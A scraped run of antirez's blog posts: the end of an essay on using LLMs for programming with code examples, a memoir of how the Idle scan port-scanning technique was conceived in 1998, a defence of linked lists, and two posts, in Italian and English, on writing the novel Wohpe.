<br>Another example, this time less about code writing and more about data interpretation. I wanted to set up a Python script using a convolutional neural network I found online, but it was quite lacking in documentation. The network had the advantage of being in ONNX format, so I could easily extract a list of inputs and outputs, and their assigned names. I only knew one thing about this convnet: it detected certain features within an image. I didn't know the input image format and size, and especially, the network's output was far more complicated than I imagined (I thought it was a binary classifier: is the observed image okay or does it have problems? Two outputs, but there were hundreds). I began by copy-pasting the ONNX network metadata output into ChatGPT. I explain to the assistant what little I know about the network. ChatGPT hypothesizes how the inputs are organized, and that the outputs are probably normalized boxes indicating parts of the images corresponding to potential defects, and other outputs indicating the likelihood of these defects. After a few minutes of back-and-forth, I had a Python script capable of network inference, plus the necessary code to transform the starting image into the tensor suitable for input, and so on. What struck me about that session was ChatGPT finally “understood” how the network functioned once it observed the raw output values (the logits, basically) on a test image: a series of floating-point numbers provided the context to identify the exact output details, the normalization, if the boxes where centred or if the left-top corner was specified, and so forth.
<br>
<br># Disposable Programs
<br>
<br>I could document dozens of such cases I've narrated above. It would be pointless, as it's the same story repeating itself in more or less the same way. I have a problem, I need to quickly know something that *I can verify* if the LLM is feeding me nonsense. Well, in such cases, I use the LLM to speed up my need for knowledge.
<br>
<br>However, there are different cases where I let the LLM write all the code. For example, whenever I need to write a more or less disposable program. Like this one:
<br>
<br>https://github.com/antirez/simple-language-model/blob/main/plot.py
<br>
<br>I needed to visualize the loss curve during the learning of a small neural network. I showed GPT4 the format of the CSV file produced by the PyTorch program during learning, and then I requested that if I specified multiple CSV files on the command line, I didn’t want the training and validation loss curves of the same experiment anymore, but a comparison of the validation loss curves of different experiments. The above is the result, as generated by GPT4. Thirty seconds in total.
<br>
<br>Similarly, I needed a program that read the AirBnB CSV report and grouped my apartments by month and year. Then, considering the cleaning costs, and the number of nights per booking, it would do statistics on the average rental price for different months of the year. This program is extremely useful for me. At the same time, writing it is deadly boring: there's nothing interesting. So I took a nice piece of the CSV file and did copy-paste on GPT4. I wrote to the LLM what the problem was to be solved: the program worked on the first try. I show it to you in full below.
<br>
<br>```python
<br>import pandas as pd
<br>pd.set_option('display.max_rows', None)
<br>df = pd.read_csv('listings.csv')
<br>reservations = df[df['Type'] == 'Reservation']
<br>reservations['Start Date'] = pd.to_datetime(reservations['Start Date'])
<br>reservations['Year'] = reservations['Start Date'].dt.year
<br>reservations['Month'] = reservations['Start Date'].dt.month
<br>reservations['Nightly Rate'] = (reservations['Amount'] - reservations['Cleaning Fee']) / reservations['Nights']
<br>all_listings = reservations['Listing'].unique()
<br>all_years = reservations['Year'].unique()
<br>all_months = range(1, 13)
<br>index = pd.MultiIndex.from_product([all_listings, all_years, all_months], names=['Listing', 'Year', 'Month'])
<br>all_data = pd.DataFrame(index=index).reset_index()
<br>merged_data = pd.merge(all_data, reservations, on=['Listing', 'Year', 'Month'], how='left')
<br>average_nightly_rates = merged_data.groupby(['Listing', 'Year', 'Month'])['Nightly Rate'].mean().fillna(0)
<br>print(average_nightly_rates)
<br>```
<br>
<br>To understand exactly how to group the data, which were otherwise quite scattered and disordered, requires some simple reasoning: it’s not a problem that an LLM could solve simply by regurgitating something that approximates the language it has seen. GPT4 has certainly observed similar programs during its training, but almost certainly has not seen a program that had to group things in the exact way I asked for and in a CSV file with that specific format. This shows (in my opinion) that LLMs can interpolate to some extent within the space outlined by the different programs in the training set.
<br>
<br>Writing this type of program would be, in my opinion, an imprudent use of my time. The fact that an LLM can do it for me certainly speeds up my ability to produce code in a rather direct way: I can focus on the things that matter.
<br>
<br># When things don't go as they should: System Programming
<br>
<br>Despite my success with LLMs and programming, when I write a program in C, I almost always end up using LLMs only as a more convenient form of documentation. I am an expert in system programming, and in that context, LLMs would be useful to me only if they were capable of complex reasoning: in this scenario, they almost always fail.
<br>
<br>Let's start with the prompt of this experiment:
<br>
<br>Outline the requirements of a nice, small but working C implementation of a bloom filter. Focus on the important aspects of the hashing function. Then write it, in good quality C.
<br>
<br>Also consider that your example implementation should be sized to store 100,000 elements, with a false positive probability of at most 5%. The elements added are null-terminated strings.
<br>
<br>Here’s the output:
<br>
<br>```c
<br>#include <stdio.h>
<br>#include <stdlib.h>
<br>#include <string.h>
<br>#include <math.h>
<br>
<br>#define N 100000  // Number of elements
<br>#define P 0.05    // False positive probability
<br>#define M (int)(-(N * log(P)) / (log(2) * log(2)))  // Size of bit array
<br>#define K (int)(M / N * log(2))  // Number of hash functions
<br>
<br>unsigned char bitArray[M / 8 + 1];
<br>
<br>void setBit(int n) {
<br>    bitArray[n / 8] |= 1 << (n % 8);
<br>}
<br>
<br>int getBit(int n) {
<br>    return bitArray[n / 8] & (1 << (n % 8));
<br>}
<br>
<br>// Basic hash functions (for demonstration purposes)
<br>int hash1(char *str) {
<br>    int hash = 5381;
<br>    int c;
<br>    while ((c = *str++))
<br>        hash = ((hash << 5) + hash) + c;
<br>    return abs(hash % M);
<br>}
<br>
<br>int hash2(char *str) {
<br>    unsigned long hash = 0;
<br>    int c;
<br>    while ((c = *str++))
<br>        hash = c + (hash << 6) + (hash << 16) - hash;
<br>    return abs(hash % M);
<br>}
<br>
<br>void add(char *str) {
<br>    setBit(hash1(str));
<br>    setBit(hash2(str));
<br>    // Add more hash functions if needed
<br>}
<br>
<br>int is_in(char *str) {
<br>    return getBit(hash1(str)) && getBit(hash2(str));
<br>    // Check more hash functions if used
<br>}
<br>
<br>int main() {
<br>    char *testStr = \"testString\";
<br>    add(testStr);
<br>
<br>    if (is_in(testStr)) {
<br>        printf(\"%s is probably in the set.\\n\", testStr);
<br>    } else {
<br>        printf(\"%s is definitely not in the set.\\n\", testStr);
<br>    }
<br>
<br>    return 0;
<br>}
<br>```
<br>
<br>The implementation produced by GPT4 is not exactly brilliant. Bloom filters are quite widespread. It’s not such an exotic data structure. However, it’s clear that writing a decent bloom filter requires a greater capacity for abstraction: for example, there’s the problem of finding an effective way to hash the same string N times, and being certain that the hashes are sufficiently decorrelated.
<br>
<br>Yet if you explicitly ask GPT4 to modify the hashing function so that it produces N decorrelated outputs, its proposed solution is significantly more acceptable:
<br>
<br>```c
<br>unsigned int hash(const char* str, unsigned int hash_id) {
<br>    unsigned int hash = 5381;
<br>    int c;
<br>    while ((c = *str++)) {
<br>        hash = ((hash << 5) + hash) + c + hash_id;
<br>    }
<br>    return hash % BF_SIZE;
<br>}
<br>```
<br>
<br>If it had come up with this idea on its own, it would have written the bloom filter differently, setting K bits at a time using a single hashing function.
<br>
<br>GPT4 was able to perform, in isolation, the task of writing an appropriate and more generic hashing function. But in the larger project of writing a bloom filter, it failed to show sufficient reasoning ability, and instead spat out two different but similar hashing functions: this is what one would expect from a poorly written article example on bloom filters.
<br>
<br>The current weak reasoning abilities of Large Language Models, combined with a possible scarcity of sources on the subject, and even worse, potentially many low-quality sources, collectively result in this meager outcome. Yet, this is not an isolated case. The few times I attempt to use LLMs in the realm of algorithmic or system programming, the results are extremely poor, even when the expected reasoning abilities are not greater than what LLMs seem to possess in contexts like Python programming.
<br>
<br>At the same time, GPT-4 is capable of decompiling the function it produced (in a separate session), and also precisely understand its purpose:
<br>
<br>https://chat.openai.com/share/f54b64d7-d19a-4be4-8f10-08553aa812f1
<br>
<br>Therefore, stating that there are no uses in system programming contexts is certainly inaccurate.
<br>
<br>One interesting and pretty much expected thing is that, in these cases, the difference between smaller and larger models is indeed significant. Let’s see how two local models fare.
<br>
<br>For instance, Mixtral, the MoE of Mistral, responded to the same question as follows:
<br>
<br>```c
<br>unsigned int hash(const char* str, unsigned int hash_id) {
<br>    unsigned int hash = 5381;
<br>    int c;
<br>    while ((c = *str++)) {
<br>        hash = ((hash << 5) + hash) + c;
<br>    }
<br>    return hash + hash_id;
<br>}
<br>```
<br>
<br>Clearly, adding `hash_id` only at the end is an extremely poor solution. Mixtral is an excellent model for many uses, but as for the already weak reasoning capabilities of LLMs, the rule so far is certainly: larger is better.
<br>
<br>This is a chat with the local LLM deepseek-coder, quantized to 4 bits as I don’t have enough RAM to use the model at higher precision. Yet, being 34 billion parameters large, its reasoning capabilities on this matter seem quite advanced. Here’s the log of the chat (conducted with llama.cpp):
<br>
<br>> I have a hash function that should output N distinct hashes for the same data. However, I'm seeing a very poor distribution of the produced hashes as I change the value of hash_id:
<br>
<br>unsigned int hash(const char* str, unsigned int hash_id) {
<br>    unsigned int hash = 5381;
<br>    int c;
<br>    while ((c = *str++)) {
<br>        hash = ((hash << 5) + hash) + c;
<br>    }
<br>    return hash + hash_id;
<br>}
<br>
<br>Maybe the salting strategy I'm using is poor? How could I change it?
<br>
<br>[Deep-seek coder reply]
<br>
<br>A possible issue with your implementation is that you're simply adding `hash_id` to the end of the hash. This can potentially lead to a poor distribution, especially if `hash_id` is too large or is not evenly distributed.
<br>
<br>Consider using bitwise operations for mixing the `hash_id` in. Here is an example with XOR:
<br>
<br>```c
<br>unsigned int hash(const char* str, unsigned int hash_id) {
<br>    unsigned int hash = 5381;
<br>    int c;
<br>    while ((c = *str++)) {
<br>        hash = ((hash << 5) + hash) ^ c + hash_id; // Using XOR to mix in the hash_id
<br>     }
<br>    return (hash ^ hash_id); // Mixing the hash_id one more time at the end
<br>}
<br>```
<br>
<br>This will spread `hash_id` throughout your hashes better than simply adding it, which can lead to less uniform distribution. [Snipped… the actual reply contained more informative stuff]
<br>
<br>Not bad for a model running on my MacBook M1 Max. It also mixed the sums with XORs. In this case, the model was certainly helped by the fact that I provided clues about the problem to solve, but it was the model that identified what the real source of the trouble was, and the proposed alternative is valid. Something like the above is not within the reach of any book, documentation, or Google search. And as primitive, a result of interpolation, or however you want to perceive it, the model has performed some form of reasoning, if by reasoning, in this specific case, we accept the identification of the origin of a problem and its potential solution. However one wants to think about LLMs, stating that they are not helpful for programmers is extremely rash.
<br>
<br>At the same time, however, my experience over the past few months suggests that for system programming, LLMs almost never provide acceptable solutions if you are already an experienced programmer. Let me show you another real world example. My current project, ggufflib, involves writing a library that reads and writes GGUF format files, which is the format in which llama.cpp loads quantized models. Initially, to understand how the quantization encodings worked (for speed reasons the bits of each quant are stored in fancy ways), I tried using ChatGPT, but then I resolved to reverse engineer llama.cpp's code: it was much faster. An LLM that can decently assist a system programmer, if it sees the data encoding “struct” declaration and the decoding function, should be able to reconstruct the data format documentation. The functions of llama.cpp were small enough to fit entirely in the context of GPT4, yet the output was completely useless. In these cases, things are done as in the past: paper and pen, reading the code, and seeing where the bits that the decoder extracts are registered.
<br>
<br>Let me explain better the above use case so that you can try it yourself, if you wish. We have this structure from llama.cpp implementation.
<br>
<br>// 6-bit quantization
<br>// weight is represented as x = a * q
<br>// 16 blocks of 16 elements each
<br>// Effectively 6.5625 bits per weight
<br>typedef struct {
<br>    uint8_t ql[QK_K/2];      // quants, lower 4 bits
<br>    uint8_t qh[QK_K/4];      // quants, upper 2 bits
<br>    int8_t  scales[QK_K/16]; // scales, quantized with 8 bits
<br>    ggml_fp16_t d;           // super-block scale
<br>} block_q6_K;
<br>
<br>Then there is this function that is used to perform the dequantization:
<br>
<br>void dequantize_row_q6_K(const block_q6_K * restrict x, float * restrict y, int k) {
<br>    assert(k % QK_K == 0);
<br>    const int nb = k / QK_K;
<br>
<br>    for (int i = 0; i < nb; i++) {
<br>
<br>        const float d = GGML_FP16_TO_FP32(x[i].d);
<br>
<br>        const uint8_t * restrict ql = x[i].ql;
<br>        const uint8_t * restrict qh = x[i].qh;
<br>        const int8_t  * restrict sc = x[i].scales;
<br>        for (int n = 0; n < QK_K; n += 128) {
<br>            for (int l = 0; l < 32; ++l) {
<br>                int is = l/16;
<br>                const int8_t q1 = (int8_t)((ql[l +  0] & 0xF) | (((qh[l] >> 0) & 3) << 4)) - 32;
<br>                const int8_t q2 = (int8_t)((ql[l + 32] & 0xF) | (((qh[l] >> 2) & 3) << 4)) - 32;
<br>                const int8_t q3 = (int8_t)((ql[l +  0]  >> 4) | (((qh[l] >> 4) & 3) << 4)) - 32;
<br>                const int8_t q4 = (int8_t)((ql[l + 32]  >> 4) | (((qh[l] >> 6) & 3) << 4)) - 32;
<br>                y[l +  0] = d * sc[is + 0] * q1;
<br>                y[l + 32] = d * sc[is + 2] * q2;
<br>                y[l + 64] = d * sc[is + 4] * q3;
<br>                y[l + 96] = d * sc[is + 6] * q4;
<br>            }
<br>            y  += 128;
<br>            ql += 64;
<br>            qh += 32;
<br>            sc += 8;
<br>        }
<br>    }
<br>}
<br>
<br>If I ask GPT4 to write an outline of the format used, it struggles to provide a clear explanation of how the blocks are stored on the lower / upper 4 bits of “ql” depending on the weight position. For this blog post, I also tried asking it to write a simpler function that shows how data is stored (maybe it can’t explain it with words, but can with code). The produced function is broken in many ways, the indexes are wrong, the 6-bit -> 8-bit sign extension is wrong (it just casts to uint8_t), and so forth.
<br>
<br>Btw, this is the code that I ended writing myself:
<br>
<br>    } else if (tensor->type == GGUF_TYPE_Q6_K) {
<br>        uint8_t *block = (uint8_t*)tensor->weights_data;
<br>        uint64_t i = 0; // i-th weight to dequantize.
<br>        while(i < tensor->num_weights) {
<br>            float super_scale = from_half(*((uint16_t*)(block+128+64+16)));
<br>            uint8_t *L = block;
<br>            uint8_t *H = block+128;
<br>            int8_t *scales = (int8_t*)block+128+64;
<br>            for (int cluster = 0; cluster < 2; cluster++) {
<br>                for (uint64_t j = 0; j < 128; j++) {
<br>                    f[i] = (super_scale * scales[j/16]) *
<br>                           ((int8_t)
<br>                            ((((L[j%64] >> (j/64*4)) & 0xF) |
<br>                             (((H[j%32] >> (j/32*2)) & 3) << 4)))-32);
<br>                    i++;
<br>                    if (i == tensor->num_weights) return f;
<br>                }
<br>                L += 64;
<br>                H += 32;
<br>                scales += 8;
<br>            }
<br>            block += 128+64+16+2; // Go to the next block.
<br>        }
<br>   }
<br>
<br>From the function above, I removed what was the actual contribution of this code: the long comments documenting the exact format used by llama.cpp Q6_K encoding. Now, it would be immensely useful if GPT could do this for me, and I bet it’s just a matter of months, because these kind of tasks are within what can be reached without any breakthrough, just with a bit of scaling.
<br>
<br># Putting Things in Perspective
<br>
<br>I regret to say it, but it's true: most of today's programming consists of regurgitating the same things in slightly different forms. High levels of reasoning are not required. LLMs are quite good at doing this, although they remain strongly limited by the maximum size of their context. This should really make programmers think. Is it worth writing programs of this kind? Sure, you get paid, and quite handsomely, but if an LLM can do part of it, maybe it's not the best place to be in five or ten years.
<br>
<br>And then, do LLMs have some reasoning abilities, or is it all a bluff? Perhaps at times, they seem to reason only because, as semioticians would say, the \"signifier\" gives the impression of a meaning that actually does not exist. Those who have worked enough with LLMs, while accepting their limits, know for sure that it cannot be so: their ability to blend what they have seen before goes well beyond randomly regurgitating words. As much as their training was mostly carried out during pre-training, in predicting the next token, this goal forces the model to create some form of abstract model. This model is weak, patchy, and imperfect, but it must exist if we observe what we observe. If our mathematical certainties are doubtful and the greatest experts are often on opposing positions, believing what one sees with their own eyes seems a wise approach.
<br>
<br>Finally, what sense does it make today not to use LLMs for programming? Asking LLMs the right questions is a fundamental skill. The less it is practiced, the less one will be able to improve their work thanks to AI. And then, developing a descriptive ability of problems is also useful when talking to other human beings. LLMs are not the only ones who sometimes don't understand what we want to say. Communicating poorly is a great limitation, and many programmers communicate very poorly despite being very capable in their specific field. And now Google is unusable: using LLMs even just as a compressed form of documentation is a good idea. For my part, I will continue to make extensive use of them. I have never loved learning the details of an obscure communication protocol or the convoluted methods of a library written by someone who wants to show how good they are. It seems like \"junk knowledge\" to me. LLMs save me from all this more and more every day.
<a href=\"http://antirez.com/news/140\">Comments</a>" nil "http://antirez.com/news/140" "913959280f75763d0a399422751f5e33") (92 (26588 31767 80007 337000) "http://antirez.com/news/139
" "The origins of the Idle Scan " nil "Thu, 19 Oct 2023 10:40:27 +0000" "The Idle scan was conceived at the end of 1998, evidenced by emails. I had moved to Milan a few months prior, having been there since September if I recall correctly, brimming with new ideas, unaware that my stay in that city would be brief. I spent the summer on the beaches of Sicily, mainly occupied with reading many books recommended by the folks at Seclab (mostly by David). However, those readings needed a catalyst: the Idle scan was an attack born from theoretical rumination, but the stream of thoughts originated from a rather practical circumstance. I had recently created Hping, a tool whose logo was borrowed from that of Nutella. I mention this to emphasize the seriousness that governed my efforts at that time — after all, I was only twenty-one and already in Northern Italy with a full-time job on my shoulders; some understanding was warranted.
<br>
<br>Hping was a Swiss Army knife for the TCP/IP protocol. Its initial use was mostly exploratory, for research. With Hping, you could assemble TCP, UDP, and ICMP packets in the most bizarre manner, and encapsulate them in equally eccentric IP packets, fragmented, with fields set to anomalous values. These packets were sent around to observe the network stack response of different operating systems.
<br>
<br>This is where Idle scan originates: playing with Hping for just a few minutes revealed a well-known yet (to me) surprising fact. The response packets had an ID field that continuously incremented by some measure. At that time, given that the attacks I would later disclose were not yet known, this ID field behavior aroused no concern. Every time an operating system emitted an IP packet, it first incremented a counter (which reset to zero once it reached the maximum value of two to the sixteenth power minus one), then the packet was sent with the ID set to the counter's value. The counter was universal for all outgoing packets. This allowed, for starters, to estimate the outgoing traffic of any networked computer. This information leak struck me; I saw it as a concerning anomaly. I wrote an initial post on BUGTRAQ, highlighting the issue. Among the responses was one from an Internet luminary, someone who had drafted central RFCs for the TCP/IP protocol. He said that, yes, they were aware; it was a well-known fact. In short: although this characteristic could be used for traffic estimation, most saw no risk. And resolving that issue, deemed negligible, would require a significant overhaul of operating systems. Not worth it.
<br>
<br>But I was losing sleep over it, hardly a secondary issue to me. I was convinced that the information provided by the incrementing ID field could be combined with other elements (which I had not fully grasped yet) to mount a far more serious attack. I discussed it with Lorenzo Cavallaro. Lorenzo had introduced me to raw socket techniques months earlier, which I had used to write Hping. He had become my go-to conversational partner, as well as a dear friend; if I had to ponder on TCP/IP-related matters, I would discuss them with him. When I told him about these new ideas, I had to be vague, not by choice but because I hadn't yet pieced together the final attack. Despite my vagueness, he appeared fairly interested.
<br>
<br>A couple of days later, I spoke to him again. Finally, I managed to give him a more comprehensive description of the Idle scan (not yet named as such). I had reasoned it out on paper, as there was no way to test it practically. If I remember correctly, Hping was missing some of the necessary functions, although I wouldn't bet on this part: it's been twenty-five years. My memory clears as I write. I believe you couldn't choose the exact flags of the outgoing TCP packet. Anyway, from what I remember, the modifications to Hping took little time, so we were able to test my theory in practice as well. The Idle scan really worked, and proving it in real conditions was very exciting. I don't remember who made this parallel, but essentially, it was like observing the movement of an invisible celestial body indirectly, measuring only its gravitational effects on another, more easily observable body, much like the discovery of Pluto.
<br>
<br>All that was left was to make the attack public. Unfortunately, the thought of writing a lengthy email in English terrified me. I was aware that the Idle scan was an interesting idea, and precisely because of that, I was afraid of botching its announcement due to poor presentation. After all, the attack was cumbersome; it could even end up being described so poorly as to make it incomprehensible. Lorenzo and I wrote that email late at night, at my place, certainly drunk. Better than writing it alone; Lorenzo's English, even if slightly, was better than mine. It happened that a colleague from Seclab (also one of the founders), whom I consider a true genius in information security, came from a family of restaurateurs from Emilia. One evening he shows up at my place with a bag. Inside the bag is a fine piece of grey mullet roe, which I had never seen, let alone tasted (it would become one of my favorite foods). The cook-hacker prepares pasta for all of us, and together we eat and drink sufficiently. At the end of the evening, the others leave (there was someone else, besides the cook-hacker), but Lorenzo stays a bit longer.
<br>
<br>That evening, Lorenzo and I, fairly tipsy, recklessly thought the time had come to write the Idle scan announcement email (still preserved in the BUGTRAQ archives, and which today appears genuinely delirious [1]). We sit down at my PC to work. The email opens like this: I have uncovered a new tcp port scan method. Instead all others it allows you to scan using spoofed packets, so scanned hosts can't see your real address. Not just the grammar, even the peremptory tone of the email is utterly inappropriate. To top it off, we propose calling the attack dumb host scan, but fortunately, someone quickly finds a better name, which became the official one: Idle scan. Long story short, despite its flawed origins, the Idle scan has become a classic attack, and it's safe to say, as is often the case, that the rest is history.
<br>
<br>[1] https://seclists.org/bugtraq/1998/Dec/79
<a href=\"http://antirez.com/news/139\">Comments</a>" nil "http://antirez.com/news/139" "bfe53ee0d052a9b03264f3384fba601f") (91 (26588 31767 79678 8000) "http://antirez.com/news/138
" "In defense of linked lists " nil "Fri, 04 Nov 2022 18:46:29 +0000" "A few days ago, on Twitter (oh, dear Twitter: whatever happens I’ll be there as long as possible – if you care about people that put a lot of energy in creating it, think twice before leaving the platform). So, on Twitter, I was talking about a very bad implementation of linked lists written in Rust. From the tone of certain replies, I got the feeling that many people think linked lists are like a joke. A trivial data structure that is only good for coding interviews, otherwise totally useless. In a word: the bubble sort of data structures. I disagree, so I thought of writing this blog post full of all the things I love about linked lists.
<br>
<br>So, get ready to read a sentimental post about a data structure, and don't tell I didn't warn you.
<br>
<br>Linked lists are educational. When your teacher, or the page of a book, or anything that exposes you for the first time to linked lists shows you this little circle with an arrow pointing to another circle, something immense happens in your mind. Similar to what happens when you understand recursion for the first time. You get what data structures made of links truly are: the triviality of a single node that becomes a lot more powerful and complex once it references another one. Linked lists show the new programmer fundamental things about space and time in computation: how it is possible to add elements in a constant time, and how order is fundamentally costly, because if you want to insert an element “in place” you have to go from one node to the other. You immediately start thinking of ways to speed up the process (preparing you for the next things), and at the same time you understand, deeply, what O(1) and O(N) really mean.
<br>
<br>Linked lists are augmentable. Add a pointer to the previous element, and now it is possible to go both sides. Add “far” pointers from time to time, and you have a skip list with completely different properties. Change every node to hold multiple items and your linked list becomes unrolled, providing very different cache obviousness properties. Linked lists can be embedded, too. The Linux kernel, for instance, has macros to add a field to any structures in order to link them together. There is more: linked lists are composable. This is a bold property: you can split a linked list into two in O(1), and you can glue two linked lists in O(1) as well. If you make judicious use of this property, interesting things are possible. For instance, in Redis modules implementing threaded operations, the thread processing the slow request dealt with a fake client structure (this way there was no locking, no contention). When the threaded command finally ended its execution, the output buffer of the client could be glued together to the actual buffer of the real client. This was easy because the output buffer was represented with a linked list.
<br>
<br>Linked lists are useful: Redis can be wrong, but both Redis and the Linux kernel can’t. They are useful because they resemble certain natural processes: adding things in the order they arrive, or in the reverse order, is natural even in the physical world. Pulling items incrementally is useful too, as it is moving such items from head to tail, or moving them a position after the current one.
<br>
<br>Linked lists are simple. It is one of those rare data structures, together with binary trees and hash tables and a few more, that you can implement just from memory without likely stepping into big errors.
<br>
<br>Linked lists are conceptual. A node pointing to itself is the most self centered thing I can imagine in computing: an ideal representation of the more vulgar infinite loop. A node pointing to NULL is a metaphor of loneliness. A linked list with tail and head connected, a powerful symbol of a closed cycle.
<br>
<br>For all those reasons, I love linked lists, and I hope that you will, at least, start smiling at them.
<a href=\"http://antirez.com/news/138\">Comments</a>" nil "http://antirez.com/news/138" "880e21751bf94802b31fe3dcab4e0a9d") (90 (26588 31767 79433 196000) "http://antirez.com/news/137
" "Scrivendo Wohpe " nil "Sun, 17 Jul 2022 09:31:34 +0000" "(English translation of this post: http://antirez.com/news/136)
<br>
<br>Dopo due anni di lavoro, finalmente, Wohpe, il mio primo libro di fantascienza, ma anche il mio primo scritto di prosa di questa lunghezza, è uscito nelle librerie fisiche italiane, su Amazon, e negli altri store digitali. Lo trovate qui: https://www.amazon.it/Wohpe-Salvatore-Sanfilippo/dp/B09XT6J3WX
<br>
<br>Dicevo: il primo scritto di questa lunghezza. Ma posso considerarmi del tutto nuovo alla scrittura? Ho scritto per vent’anni in questo blog e in quelli passati che ho tenuto nel corso del tempo, e molto spesso ho usato Facebook per scrivere brevi racconti, frutto di fantasie o basati su fatti reali. Oltre a ciò, ho scritto di cose tecniche, specialmente riguardo la programmazione, per un tempo altrettanto lungo, e sono stato un lettore di racconti e di romanzi per tutto il corso della mia vita. E allora perché scrivere Wohpe è stato anche imparare a scrivere da zero?
<br>
<br>Nei primi mesi di scrittura del romanzo, ma anche prima, nei mesi precedenti, quando mi preparavo scrivendo lunghi racconti che poi avrei cestinato, mi è successo ciò che accade spesso a coloro che imparano a giocare a scacchi. Tanti seguono questo percorso: imparano le regole, e va bene, lo sappiamo che con quelle si fa poco; le regole permettono solo di muovere i pezzi in maniera legale. Ma poi, subito dopo, imparano dei rudimenti di tecnica e di strategia, magari studiando duramente per qualche settimana. Però quando sono alla scacchiera, se una mossa non è brutalmente peggiore o migliore di un’altra, tutte le mosse sembrano equivalenti. Il giocatore di scacchi poco abile, poco esperto, non ha un vero gusto per le mosse; non riesce a valutarle non solo per ciò che sono in termini assoluti, ma neanche secondo una sua propria idea. Il risultato è un gioco casuale. Solo più avanti, dopo molte ore di gioco, ella finalmente riuscirà a esprimere delle scelte che, a prescindere dal fatto siano esse giuste o sbagliate, hanno quantomeno una coerenza, sono state davvero pensate: voglio muovere il cavallo qui, per queste precise ragioni, e per tali ragioni preferisco questa mossa a tutte le altre possibili.
<br>
<br>Così chi scrive ed è agli inizi, se una frase è buona, con certezza non lo sa (e per continuare col paragone di sopra, così come il gioco dello scacchista sarà casuale, la sua scrittura sarà casuale). Sposta una virgola, cambia una parola. Suona bene o male? Ha delle idee che si è formato scrivendo a scuola e poi scrivendo da adulto, ma queste idee lo assistono poco quando l’ambizione è quella di scrivere una prosa di livello letterario. L’autore alle prime armi non ha un suo stile, perché prima di non saper scrivere non sa ancora leggere: quando legge un libro che adora, raramente capisce esattamente *cosa* accade nella pagina di così convincente, e così anche quando rilegge se stesso, non sa se ha scritto bene o male. Leggi, se vuoi imparare a scrivere! Dicono tutti. Peccato non sia vero: bisogna prima di tutto scrivere per imparare a scrivere, così come bisogna fare dei cortometraggi per imparare a fare il regista, e guardare gli altri film non sarà sufficiente (anche se sarà certamente utile). E per imparare a scrivere, il tipo di lettura che serve davvero è la rilettura di alcuni libri che abbiamo scelti come modelli; quello sì che è utile: la rilettura per comprenderne le forme, fino in fondo. Ora questo semplice fatto, di aver capito quale sia il mio stile, e di saper finalmente leggere e avere un giudizio che emerge immediatamente quando ho tra le mani un’opera, è già un risarcimento più che sufficiente dei due anni di sforzi di scrittura nei quali mi sono profuso.
<br>
<br>Ed è una vera fortuna che l’esperienza in sé sia stata di così grande valore, perché quello che molti nuovi autori non sanno è quanto violento possa essere il mercato editoriale mondiale, e quello italiano in particolare. In Italia un libro di fantascienza che ha un buon successo, edito da un piccolo o medio editore, vende 500 copie. Deve andare bene, per avere questi numeri. La gran parte dei libri vende meno di 100 copie. A noi informatici queste cifre fanno rabbrividire. Il più stupido programma che ho scritto ha avuto dieci volte più utenti. Mi spingerei a dire che il più stupido programma che ho scritto e che ho pubblicato con un minimo di energie, ha avuto dieci volte questi *lettori*, gente che ne hanno letto il codice sorgente per capire come funzionasse. Io sono stato, e per questo ringrazio non so bene chi, un programmatore di una certa notorietà, direte voi. Ciò che voglio dire va molto oltre la mia esperienza personale. Anche coloro che non sono conosciuti da nessuno e provano a fare, nella programmazione, una cosa mediamente interessante, appena ben descritta e documentata, e la mostrano un po’ in giro, ricevono un interesse enorme rispetto a quello che spetta agli autori di fiction. I motivi sono tanti e abbastanza ovvi, non vale neppure la pena di soffermarsi su di essi, dunque perché vi racconto queste cose? Per questo motivo:
<br>
<br>Sono poche le attività, oltre alla letteratura, dove c’è lo stesso mostruoso scompenso tra le forze necessarie per produrre un’opera e la scarsa risposta del pubblico. Chi decide di dedicare molto tempo alla scrittura, deve conoscere questo fatto da subito. Io per fortuna sapevo già tutto, grazie ai miei amici scrittori; però lo stesso certe sfumature di questa irrilevanza finiscono per essere difficili da accettare.
<br>
<br>E allora perché tutti scrivono? Sono straripanti le file di quelli che tentano la fortuna editoriale. Credo sia un meccanismo simile a quello che accade nell’IT, con tanti che provano a creare un nuovo linguaggio di programmazione: il fallimento è quasi certo, ma il tentativo stesso è una delle imprese più soddisfacenti alle quali dedicare le proprie migliori energie.
<br>
<br>Ora sono a un bivio: potrei scrivere altra prosa, rimettermi a scrivere codice, o provare a tenere vive le due attività allo stesso tempo. Cosa farò non lo so ancora. Per ora, vediamo cosa succede con Wohpe, sia con la versione italiana che con la traduzione in inglese, a cui in questo momento una capace traduttrice sta lavorando. E su questa cosa delle traduzioni, eseguite col supporto dell’autore, e di quale esperienza significativa sia dal punto di vista filologico, magari vi parlerò qualche altra volta (io e Bridget parliamo l’inglese e l’italiano, ma siamo madrelingua lei di una e io dell’altra lingua, e ciò è molto interessante quando si collabora tra traduttore e autore). Chiudo il post dicendo a chi mi legge: se ne avete voglia, scrivete prosa! Io ora lo so per certo: non è un caso che la scrittura sia stata per centinaia di anni considerata l’arte più alta nella quale cimentarsi. Scrivendo si cercano delle cose, e se si insiste abbastanza si finisce per trovarle davvero.
<a href=\"http://antirez.com/news/137\">Comments</a>" nil "http://antirez.com/news/137" "1b4341a720b41ef8508162ad3ea182ea") (89 (26588 31767 79065 44000) "http://antirez.com/news/136
" "Writing Wohpe " nil "Sun, 17 Jul 2022 09:31:06 +0000" "(Traduzione italiana di questo post: http://antirez.com/news/137)
<br>
<br>[Sorry for the form of this post. For the first time I wrote a post in two languages: Italian and English. So I went for the unusual path of writing it in Italian to start, translating it with Google Translate, and later I just scanned it to fix the biggest issues. At this point GT is so good you can get away with this process.]
<br>
<br>After two years of work, finally, Wohpe, my first science fiction book, but also my first prose writing of this length, has been released in Italian physical bookstores, on Amazon, and in other digital stores. You can find it here: https://www.amazon.it/Wohpe-Salvatore-Sanfilippo/dp/B09XT6J3WX
<br>
<br>I was saying: the first writing of this length. But can I consider myself entirely new to writing? I have written for twenty years in this blog and in the past ones that I have kept over time, and very often I have used Facebook to write short stories, the result of fantasies or based on real facts. On top of that, I've been writing about technical stuff, especially programming, for an equally long time, and I've been a short story and novel reader my entire life. So why was writing Wohpe also learning how to write from scratch?
<br>
